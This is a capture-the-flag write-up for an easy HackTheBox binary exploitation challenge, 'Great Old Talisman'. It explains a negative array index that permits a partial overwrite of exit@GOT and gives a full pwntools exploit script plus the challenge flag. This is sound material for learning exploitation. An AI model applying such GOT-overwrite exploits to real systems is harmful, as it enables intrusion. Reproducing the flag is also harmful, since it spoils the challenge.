---
title: "Great Old Talisman"
ctf: "HTB"
date: 2026-06-06
category: pwn
difficulty: easy
points: N/A
flag_format: "HTB{...}"
author: "gluppler"
---

# Great Old Talisman

## Summary

Arbitrary 2-byte write via unchecked array index into GOT. Overwrite unresolved `exit@GOT` to redirect to `read_flag` win function.

## Solution

### Step 1: Find the vulnerability

The binary reads an integer choice via `scanf("%d")`, then writes 2 bytes from stdin to `talis[choice*8]` with no bounds check. The `talis` array is at `0x4040a0` in `.data`. Negative indices let us write to GOT entries at lower addresses.

A `read_flag` function at `0x40135a` opens `flag.txt` and prints it character by character.

### Step 2: Partial overwrite of exit@GOT

`exit@GOT` is at `0x404080`, offset `-4` from `talis` (since `(0x404080 - 0x4040a0) / 8 = -4`). At the time of our input, `exit` has not been called yet, so its GOT entry still points to the PLT stub at `0x4011fa`. Overwriting the lower 2 bytes with `0x135a` changes the target to `0x40135a` = `read_flag`.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

read_flag = 0x40135a
exit_got = 0x404080
talis = 0x4040a0
index = (exit_got - talis) // 8

def exploit(p):
    p.sendlineafter(b'>> ', str(index).encode())
    p.sendafter(b'Spell: ', p16(read_flag & 0xffff))
    print(p.recvall(timeout=5).decode(errors='replace'))

if __name__ == '__main__':
    import sys
    if len(sys.argv) > 1 and sys.argv[1] == 'remote':
        p = remote(sys.argv[2], int(sys.argv[3]))
    else:
        p = process('./challenge/great_old_talisman',
                    cwd='/home/gluppler/Downloads/CTFs-Testing/Pwn/Easy/Great-Old-Talisman/challenge')
    exploit(p)
```

## Flag

```
HTB{t4l15m4n_G0T_ur_b4ck}
```
